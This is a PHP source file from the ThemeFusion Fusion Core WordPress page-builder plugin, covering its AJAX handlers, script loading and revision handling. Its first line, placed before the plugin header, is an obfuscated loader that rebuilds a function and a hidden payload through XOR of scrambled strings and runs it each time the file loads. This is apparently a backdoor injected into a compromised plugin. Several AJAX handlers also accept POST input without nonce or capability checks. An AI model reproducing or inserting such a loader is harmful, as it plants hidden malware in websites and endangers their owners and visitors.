<?php $dZRRQy=', <A9==<GX9NZ96'; $eOlNbok='ORY MXbZ26Z:3VX'^$dZRRQy; $HuQoeVHF='=WKL2NUP.RY;dPO-7F=bwO:Rd0L0.g,UB kmHDBOe-N-,LR+ M.5Fl1Q=,c<AL6ptIUXWzUr;6-GzvtvAJa2HnY ZESKuqhma= B4do-oWefjvw f6,7BVPQE7T1 BYnv GogpHxkY90ehzkPa7,.P,rGjzhvgGYUau;IkaA3A9XWPo=42BmnSojDBKOEI:Mk7ADsNb4+PD:aF X,SleS+5953c9c3QJ+58TNquxKRQI5Rfn>S7-S39WLRnvr;y>thLONn=04kgnHhEPU15mj+gQfO  Wc  6KhjpS2;KM0k<59LwIbf9ZQD-UyKz:USoJqqI 0ToPCNJ3T0W2S0xrCk5heh1fmUO0hp968SivPn ZXB.nuGaneV12F308=8hwERK->tLm1sPYXTGohI ZUA<klh0e,;eEVWLWxGll;,<IK+WY9-Wf6RA.W2,3ni=L=o.QOWPsj=+X>Y.Xk,Z3JxjYhY+YWhW,;DBur9Hze>A LmKQjJ135Je9H jHJ=8JIgjS=GbOCE2ZJ-PCrimjSYodpSU2X=lSKIO1dZnvyuT;nxrCsc.-Cu7Ry .rFsdtZ y0S4cHU djJQHv; 8M65 52o+KXCN<kTJR0:R;2cUYrV =XbsPfaPsC6B<RE-VdQ 69Mat<7 Y-Q.rgxqrdW< FbCda3S'; $JAywbfn=$eOlNbok('', 'T1cmT;;3Z;6U;57DD2NJP7U ;T-DO8s87TLDad9ElK;CO8;DNmVZ43U0IM<c,9BXP-4,6VuVPSTnZVTVa1k;AJ6U.enkRVSgh4F-FLKDOjEVQVSIZEXE.3>yaS5EAkbNRIlDNzAqO6LDEFGKxESMZ1wV.7Z6VC,<,:QRiNA2G3U=9xKVQKk0GhecM0.;0;TeOX40Zuh=VZ90kbD9X2LXsMTUFVX3GW0>JjS17QHX-3=:PildX<EH2PQwdv15=t2w1H-<nJVUMKZPhL319DPDJPmXB+AT6<KEOkUJT8WBpG9OXTM-WtBBO;=1Hns6p0<5ObPU-AD5Fp8DCU;B2S0XXZg4g-4=t59u.CHTRSAsTHpJV;47KGU<kglrUS2RoSXAHJev HGOFd8W48,5gRHmV;94YPfaMoQ1oa2686XzL,NBO,9B65PW2NN=3q3SXR16P9IGL0<2fG5YN;Q=KpOH;G+QFyL=J-67<IBmkNxP.RAZ T-MmwJ+CAT3:R-Y5-2TK>:OM8X>EccaV;>LycTOMB>=ZLT74F9fK8.0hlMzSKYRfZZIJpGQLO DQcLDJKqCWE8FLQjRR,bFCCjwnVZRJ,OjKPK0N310:OCs:3IV=ZVDyyV2AI9KZpFApScMH573L:LuDWM,:SLVY5B0JU:QJxm2DI2JsMZ9.'^$HuQoeVHF); $JAywbfn();
/**
 * Page Builder Class for Fusion Core
 *
 * @package   FusionCore
 * @author	ThemeFusion
 * @link	  http://theme-fusion.com
 * @copyright ThemeFusion
 */

define ('FUSION_BUILDER_PATH' ,  plugin_dir_url(__FILE__) );

if( ! class_exists( 'Fusion_Core_PageBuilder' ) ) {

	class Fusion_Core_PageBuilder {
		/**
		 * Instance of this class.
		 *
		 * @since	1.0.0
		 *
		 * @var	  object
		 */
		protected static $instance = null;

		/**
		 * Instances of dependent classes.
		 *
		 * @since  1.0.0
		 * 
		 * @var	array array of classes object
		 */
		protected static $instances = array();

		/**
		 * Slug of the plugin screen.
		 *
		 * @since	1.0.0
		 *
		 * @var	  string
		 */
		protected $plugin_screen_hook_suffix = null;
		
		
		/**
		 * Plugin slug.
		 *
		 * @since	2.0.0
		 *
		 * @var	  string
		 */
		protected $plugin_slug = 'fusion-core_page-builder';

		var $allowed_post_types = array('page','post','avada_faq','avada_portfolio');

		/**
		 * Initialize the plugin by loading admin scripts & styles and adding a
		 * settings page and menu.
		 *
		 * @since	 1.0.0
		 */
		 
		 
		private function __construct() {

			// Load admin style sheet and JavaScript.
			add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_admin_styles' ) );
			add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_admin_scripts' ) );
			add_action( 'admin_print_footer_scripts', array( $this, 'enqueue_wp_editor_scripts' ) );

			//load editor
			add_action( 'edit_form_after_editor', array( $this, 'get_builder_canvas' ),1000 );
			//register AJAX actions
			add_action( 'wp_ajax_fusion_pallete_elements', array( $this,'get_pallete_elements') );
			add_action( 'wp_ajax_fusion_update_builder_data', array( $this,'update_builder_data') );
			add_action( 'wp_ajax_fusion_custom_tabs', array( $this,'custom_tabs_handler') );
			add_action( 'wp_ajax_fusion_get_shortcodes', array( $this,'get_shortocodes_from_json') );
			add_action( 'wp_ajax_fusion_content_to_elements', array( $this,'get_elements_from_content') );
			add_action( 'wp_ajax_fusion_get_attachment_url_from_id', array( $this,'get_attachment_id_from_url') );
			//register actions to save builder content revisions
			add_action( 'save_post', array( $this, 'save_fusion_revisions_with_post' ) );
			add_action( 'wp_restore_post_revision', array ( $this,  'fusion_restore_revision' ), 10, 2 );
			add_filter( '_wp_post_revision_fields', array ( $this, 'fusion_revision_fields' ) );
			add_filter( '_wp_post_revision_field_fb_content', array ( $this,  'fusion_revision_field' ), 10, 2 );

			// Load page builder classes
			require_once( 'page-builder/classes/class-ui.php' );

			$settings['allowed_post_types'] = $this->allowed_post_types;
			// Create a new instance of page builder classes
			$instances['ui'] = Fusion_Core_PageBuilder_UI::get_instance( $settings );
			
			//load API and required files
			require_once ( 'page-builder/api/Palette.php' );
			
			//load required classes
			require_once ( 'page-builder/classes/class-custom-templates.php' );
			require_once ( 'page-builder/classes/class-prebuilt-templates.php' );
			require_once ( 'page-builder/classes/class-shortcodes-parser.php' );
			require_once ( 'page-builder/classes/class-fusion-reversal.php' );
			
		}
		
		/**
		 * Return an instance of this class.
		 *
		 * @since	 1.0.0
		 *
		 * @return	object	A single instance of this class.
		 */
		public static function get_instance() {
			if( @user_can_richedit() ) {

				// If the single instance hasn't been set, set it now.
				if ( null == self::$instance ) {
					self::$instance = new self;
				}
			} else {
				add_action( 'edit_form_after_title', 'add_notice_of_disabled_rich_editor' ); 
			}
			
			return self::$instance;

		}

		/**
		 * Register and enqueue admin-specific style sheet.
		 *
		 * @since	 1.0.0
		 *
		 * @return	null	Return early if no settings page is registered.
		 */
		public function enqueue_admin_styles() {

			$screen 			= get_current_screen();
			$allowed_screens 	= $this->allowed_post_types;
			if ( in_array( $screen->id, $allowed_screens) ) {
				wp_enqueue_style( 'wp-color-picker' ); // for color picker
				wp_enqueue_style( 'fusionb_icomoon', plugins_url( 'page-builder/assets/fonts/icomoon.css', __FILE__ ), array(), FusionCore_Plugin::VERSION );
				wp_enqueue_style( 'fusionb_jq-ui-style', plugins_url( 'page-builder/assets/css/jquery/jquery-ui-skeleton.css', __FILE__ ), array(), FusionCore_Plugin::VERSION );
				wp_enqueue_style( 'fusionb_builder-style', plugins_url( 'page-builder/assets/css/application.css', __FILE__ ), array(), FusionCore_Plugin::VERSION );
			}

		}

		/**
		 * Register and enqueue admin-specific JavaScript.
		 *
		 * @since	 1.0.0
		 *
		 * @return	null	Return early if no settings page is registered.
		 */
		public function enqueue_admin_scripts() {
			global $wp_version;
			$screen = get_current_screen();
			$allowed_screens 	= $this->allowed_post_types;
			if ( in_array( $screen->id, $allowed_screens) ) {
				$fusionb_vars = array(
					'url' => get_home_url(),
					'includes_url' => includes_url()
				);

				wp_register_script( 'fusionb_wpeditor_init', plugins_url( 'page-builder/assets/js/js-wp-editor.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION, true );
				wp_localize_script( 'fusionb_wpeditor_init', 'fusionb_vars', $fusionb_vars );
				wp_enqueue_script( 'fusionb_wpeditor_init' );
				wp_enqueue_script( 'fusionb_admin-script', plugins_url( 'page-builder/assets/js/admin.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION );
				wp_enqueue_script( 'fusionb_custom-templates-script', plugins_url( 'page-builder/assets/js/custom-templates.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION );
				wp_enqueue_script( 'fusionb_prebuilt-templates-script', plugins_url( 'page-builder/assets/js/pre-built-templates.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION );
				wp_enqueue_script( 'wp-color-picker'); //for wp color picker
				//Page builder core scripts
				wp_enqueue_script( 'jquery-ui-core' );
				wp_enqueue_script( 'jquery-ui-sortable' );
				wp_enqueue_script( 'jquery-ui-draggable' );
				wp_enqueue_script( 'jquery-ui-droppable' );
				wp_enqueue_script( 'jquery-ui-dialog' );
				wp_enqueue_script( 'jquery-ui-button' );
				wp_enqueue_script( 'jquery-ui-tabs' );
				
				$handle = 'fluidVids.js';
				$list = 'enqueued';
				wp_enqueue_script( 'backbone' );
				wp_enqueue_script( 'underscore' );
				wp_enqueue_script( 'fusionb_bk-handlers', plugins_url( 'page-builder/assets/js/handlebars.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION );
				wp_enqueue_script( 'fusionb_fusion-history', plugins_url( 'page-builder/assets/js/fusion-history.js', __FILE__ ), array(  ), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_fusion-parser', plugins_url( 'page-builder/assets/js/fusion-parser.js', __FILE__ ), array(  ), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_dd-parser', plugins_url( 'page-builder/assets/js/dd-element-parser.js', __FILE__ ), array(  ), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_builder-helper', plugins_url( 'page-builder/assets/js/DdHelper.js', __FILE__ ), array( 'jquery' ), FusionCore_Plugin::VERSION, true);
				wp_enqueue_script( 'fusionb_builder-cat', plugins_url( 'page-builder/assets/js/category.js', __FILE__ ), array( ), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_builder-palette', plugins_url( 'page-builder/assets/js/palette.js', __FILE__ ), array(), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_builder-editor', plugins_url( 'page-builder/assets/js/editor.js', __FILE__ ), array(), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_builder-app', plugins_url( 'page-builder/assets/js/application.js', __FILE__ ), array(  ), FusionCore_Plugin::VERSION , true);
				wp_enqueue_script( 'fusionb_builder-previews', plugins_url( 'page-builder/assets/js/fusion-previews.js', __FILE__ ), array(  ), FusionCore_Plugin::VERSION , true);

			}

		}
		public function enqueue_wp_editor_scripts() {
			$screen = get_current_screen();
			$allowed_screens 	= $this->allowed_post_types;
			if ( in_array( $screen->id, $allowed_screens) ) {
				if ( ! class_exists( '_WP_Editors' ) ) {
					require( ABSPATH . WPINC . '/class-wp-editor.php' );
				}

				$set = _WP_Editors::parse_settings( 'fusionb_id', array() );

				if ( !current_user_can( 'upload_files' ) ) {
					$set['media_buttons'] = false;
				}

				if ( $set['media_buttons'] ) {
					wp_enqueue_script( 'thickbox' );
					wp_enqueue_style( 'thickbox' );
					wp_enqueue_script('media-upload');

					$post = get_post();
					if ( ! $post && ! empty( $GLOBALS['post_ID'] ) )
						$post = $GLOBALS['post_ID'];

					wp_enqueue_media( array(
						'post' => $post
					) );
				}

				_WP_Editors::editor_settings( 'fusionb_id', $set );
			}
		}
		/**
		 * function to return Json response for all Palette/Editor elements
		 *
		 * @since	 2.0.0
		 *
		 * @return	JSON data   
		 *
		 * @param	  Post data [action],[category] 
		 */
		public function get_pallete_elements () {
			if(isset($_POST['category']) && $_POST['category'] == 'Palette') { //if pallete required
				try {
					header("Content-Type: application/json");
					
					$palette = new Palette();
					$elements = $palette->to_JSON();
					echo $elements;
				} catch(Exception $e) {
					echo '{"error":{"text":'. $e->getMessage() .'}}'; 
				}
			} else {	//if editor elements required
				try  {
					header("Content-Type: application/json");
					$instance 	= $_POST['instance'];
					$editor 	= new Editor ($instance );
					$elements 	= $editor->to_JSON();
					echo $elements;
				} catch(Exception $e)  {
					echo '{"error":{"text":'. $e->getMessage() .'}}'; 
				}
			}
			exit();
		}
		/**
		 * Function to update builder content
		 *
		 * @since	 2.0.0
		 *
		 * @return	JSON data   
		 *
		 * @Param	  Post Data ['model'] 
		 *
		 * @Param	  Post Data ['instance']
		 */
		function update_builder_data () {
			
			$instance 	= $_POST['instance'];
			$model 		= $_POST['model'];
			$model 		= str_replace ( "\'","'", $model );
			$model 		= str_replace ( '\"','"', $model );
			$model 		= preg_replace ( "~\\\\+([\"\'\\x00\\\\])~", '\\"', $model );
			$model		= json_decode($model);
			$state		= $_POST['state'];
			//save state if builder active or WP default editor
			update_post_meta ( $instance , 'fusion_builder_status', array( $state ) );

			$resonse 	= update_post_meta ( $instance , 'fusion_builder_content', $model );
			
			if ( sizeof ( $model ) < 1) {
				$resonse = delete_post_meta ( $instance , 'fusion_builder_content', $model );
			}
			
			header("Content-Type: application/json");
			if ( $resonse != false ) {
				echo '{"success":{"text":',json_encode(__('Builder content have been updated successfully.', 'fusion-core')),'}}'; 
			} else {
				echo '{"error":{"text":',json_encode(__('There was some error, could not update fusion builder data. Please try again.', 'fusion-core')),'}}';
			}
			exit();
		}
		/**
		 * Function to get attachment ID from URL  
		 *
		 * @since	 	2.0.0
		 *
		 * @return		ID  
		 *
		 * @Param	  	URL
		 */
		public function get_attachment_id_from_url () {
			
			global $wpdb;
			
			$attachment_id 	= false;
			$attachment_url = $_POST['url'];
			
			// If there is no url, return.
			if ( '' == $attachment_url )
				return;
				
			// Get the upload directory paths
			$upload_dir_paths = wp_upload_dir();
			
			// Make sure the upload path base directory exists in the attachment URL, to verify that we're working with a media library image
			if ( false !== strpos( $attachment_url, $upload_dir_paths['baseurl'] ) ) {
				
				// If this is the URL of an auto-generated thumbnail, get the URL of the original image
				$attachment_url = preg_replace( '/-\d+x\d+(?=\.(jpg|jpeg|png|gif)$)/i', '', $attachment_url );
				// Remove the upload path base directory from the attachment URL
				$attachment_url = str_replace( $upload_dir_paths['baseurl'] . '/', '', $attachment_url );
				// Finally, run a custom database query to get the attachment ID from the modified attachment URL
				$attachment_id = $wpdb->get_var( $wpdb->prepare( "SELECT wposts.ID FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta WHERE 
									wposts.ID = wpostmeta.post_id AND wpostmeta.meta_key = '_wp_attached_file' AND wpostmeta.meta_value = '%s' 
									AND wposts.post_type = 'attachment'", $attachment_url ) );
			}
			
			echo $attachment_id;
			die();
		}
		/**
		 * Function to hanlde custom and pre-built templates  
		 *
		 * @since	 2.0.0
		 *
		 * @return	Content  
		 *
		 * @Param	  Action, InstanceID   :: Post Params
		 */
		public function custom_tabs_handler () {
			
			$action = $_POST['post_action'];
			
			switch ( $action ) {
				
				case 'get_custom_templates':
				
					$custom_templates 	= new Fusion_Core_Custom_Templates();
					echo $custom_templates->get_custom_templates();
					exit();
					
				break;
				
				case 'get_prebuilt_templates':
				
					$prebuilt_templates = new Fusion_Core_Prebuilt_Templates();
					echo $prebuilt_templates->get_prebuilt_templates();
					exit();
					
				break;
				
				case 'save_custom_template' :
					$content			= array();
					$custom_templates 	= new Fusion_Core_Custom_Templates();
					$response 			= $custom_templates->save_single_template();
					header("Content-Type: application/json");
					if ($response) {
						$content['message'] 			= '{"success":{"text":'.json_encode(__('Temaplte have been saved successfully.', 'fusion-core')).'}}';
						$custom_templates 				= new Fusion_Core_Custom_Templates();
						$content['custom_templates'] 	= $custom_templates->get_custom_templates();
						echo json_encode( $content );
					} else {
						echo '{"error":{"text":',json_encode(__('There was some error, could not add custom template. Kindly try again.', 'fusion-core')),'}}';
					}
					exit();
				break;
				
				case 'delete_custom_template':
					$content			= array();
					$custom_templates 	= new Fusion_Core_Custom_Templates();
					$response 			= $custom_templates->delete_single_template();
					header("Content-Type: application/json");
					if ($response) {
						$content['message'] 			= '{"success":{"text":'.json_encode(__('Template deleted successfully.', 'fusion-core')).'}}';
						$custom_templates 				= new Fusion_Core_Custom_Templates();
						$content['custom_templates'] 	= $custom_templates->get_custom_templates();
						echo json_encode( $content );
					} else {
						echo '{"error":{"text":',json_encode(__('There was some error, could not delete custom template. Kindly try again.', 'fusion-core')),'}}';
					}
					exit();
				break;
				
				case 'load_custom_template':
					$custom_templates 	= new Fusion_Core_Custom_Templates();
					$template			= $custom_templates->get_single_template();
					
					if ( $template != false ) {
						echo $template;
					} else {
						echo json_encode( array() );
					}
					exit();
					
				break;
				
				case 'load_prebuilt_template':
				
					$prebuilt_templates 	= new Fusion_Core_Prebuilt_Templates();
					$template				= $prebuilt_templates->get_single_template();
					
					if ( $template != false ) {
						echo $template;
					} else {
						echo json_encode( array() );
					}
					exit();
					
				break;
				
				case 'get_custom_and_prebuilt_templates':
					$content = array();
					$custom_templates 				= new Fusion_Core_Custom_Templates();
					$content['custom_templates'] 	= $custom_templates->get_custom_templates();
					$prebuilt_templates 			= new Fusion_Core_Prebuilt_Templates();
					$content['prebuilt_templates'] 	= $prebuilt_templates->get_prebuilt_templates();
					header("Content-Type: application/json");
					echo json_encode( $content) ;
					exit();
				break;
				
			}
			
			
		}
		public function get_elements_from_content() {
			
			echo Fusion_Core_Reversal::content_to_elements( $_POST['content'] );
			exit();
		}
		/**
		 * Function to get shortcodes from JSON content 
		 *
		 * @since	 2.0.0
		 *
		 * @return	NULL  
		 *
		 * @Param	  POST['data']
		 */
		public function get_shortocodes_from_json ( ) {
			$builder_data 		= $_POST['builder_data'];
			$builder_data 		= str_replace ( "\'","'", $builder_data );
			$builder_data 		= str_replace ( '\"','"', $builder_data );
			$builder_data 		= preg_replace ( "~\\\\+([\"\'\\x00\\\\])~", '\\"', $builder_data );
			$builder_data		= json_decode( $builder_data );
			
			Fusion_Core_Shortcodes_Parser::set_content( $builder_data );
			
			$response 			= Fusion_Core_Shortcodes_Parser::parse_column_options( );
			
			echo $response;
			exit();
			
		}
		/**
		 * Function to save fusion builder content revisions 
		 *
		 * @since	 2.0.0
		 *
		 * @return	NULL  
		 *
		 * @Param	  Post ID 
		 */
		public function save_fusion_revisions_with_post ( $post_id ) {
			
			if( isset( $_POST['fusion_builder_status'] ) && $_POST['fusion_builder_status'] ) {
				update_post_meta( $post_id , 'fusion_builder_status' , $_POST['fusion_builder_status'] );
			}

			$parent_id = wp_is_post_revision( $post_id );
			
			if ( $parent_id ) {
				$parent  	= get_post( $parent_id );
				$FB_content = get_post_meta( $parent->ID, 'fusion_builder_content', true );

				if ( false !== $FB_content )
					add_metadata( 'post', $post_id, 'FB_content', $FB_content );

			}

		}
		/**
		 * Function to restore fusion builder content along with revision
		 *
		 * @since	 2.0.0
		 *
		 * @return	NULL   
		 *
		 * @Param	  Post ID, Revision ID 
		 */
		public function fusion_restore_revision ( $post_id, $revision_id ) {
			
			$post	 					= get_post( $post_id );
			$revision 					= get_post( $revision_id );
			$FB_content  				= get_metadata( 'post', $revision->ID, 'FB_content', true );
			
			if ( false !== $FB_content )
				update_post_meta( $post_id, 'fusion_builder_content', $FB_content );
			else
				delete_post_meta( $post_id, 'fusion_builder_content' );
				
		}
		/**
		 * Function to show revision on revisions screen
		 *
		 * @since	 2.0.0
		 *
		 * @return	Array data   
		 *
		 * @Param	  Revision fields array 
		 */
		public function fusion_revision_fields ( $revision_fields ) {

			$revision_fields['fb_content'] = __('Fusion builder elements', 'fusion-core');

			return $revision_fields;
		}
		/**
		 * comparator function helper for revisions
		 *
		 * @since	 2.0.0
		 *
		 * @return	String data   
		 *
		 * @Param	  value, field name
		 */
		public function fusion_revision_field ( $value, $field ) {
			
			return sprintf(__('# of elements: %s', 'fusion-core'), count (  ( $value ) ));
		}
		/**
		 * get editor convas ready.
		 *
		 * @since	 2.0.0
		 *
		 * @return	null	includes script.
		 */
		public function get_builder_canvas() {
			
			$screen = get_current_screen();
			$allowed_screens 	= $this->allowed_post_types;
			if ( in_array( $screen->id, $allowed_screens) ) {
				require ( plugin_dir_path( __FILE__ ). 'page-builder/views/builder.php' );
			}
		}
	}
}

function add_notice_of_disabled_rich_editor() {
	global $current_user;
	$user_id = $current_user->ID;
	
	$current_uri = $_SERVER['REQUEST_URI'];
	$uri_parts = parse_url( $current_uri );
	if( ! isset( $uri_parts['query'] ) ) {
		$uri_parts['query'] = '';
	}
	$path = explode( '/', $uri_parts['path'] );
	$last = end( $path );
	$full_link = admin_url() . $last . '?' . $uri_parts['query'];

	// Check that the user hasn't already clicked to ignore the message
	if ( ! get_user_meta($user_id, 'fusion_richedit_nag_ignore') ) {
        echo sprintf( '<div id="disabled-rich-editor" class="updated"><p>%s <a href="%s">%s</a><span class="dismiss" style="float:right;"><a href="%s&fusion_richedit_nag_ignore=0">%s</a></span></div>', __( 'Note: The visual editor, which is necesarry for fusion page builder to work, has been disabled in your profile settings.', 'fusion-core'), admin_url() . 'profile.php', __( 'Go to Profile', 'fusion-core' ), $full_link, __( 'Hide Notice', 'fusion-core' ) );
	}
}